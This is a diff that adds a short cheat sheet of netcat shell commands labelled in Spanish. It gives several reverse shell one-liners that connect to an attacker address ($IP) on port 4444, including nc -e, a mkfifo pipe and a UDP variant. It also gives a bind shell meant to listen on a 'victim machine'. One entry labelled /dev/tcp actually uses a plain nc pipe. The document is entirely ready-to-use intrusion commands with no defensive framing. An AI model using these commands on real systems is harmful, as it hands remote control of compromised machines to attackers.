@@ -1,0 +1,14 @@
+▶ Reverse Shell Básica (Conectar con -e):
+  nc -e /bin/sh $IP 4444
+
+▶ Reverse Shell Alternativa (Sin -e, usando FIFO):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f
+
+▶ Bind Shell (Escuchar en máquina víctima):
+  nc -lvp 4444 -e /bin/sh
+
+▶ Reverse Shell con /dev/tcp (Enviar shell por nc):
+  /bin/sh | nc $IP 4444
+
+▶ Reverse Shell UDP (Usar protocolo UDP):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u $IP 4444 >/tmp/f
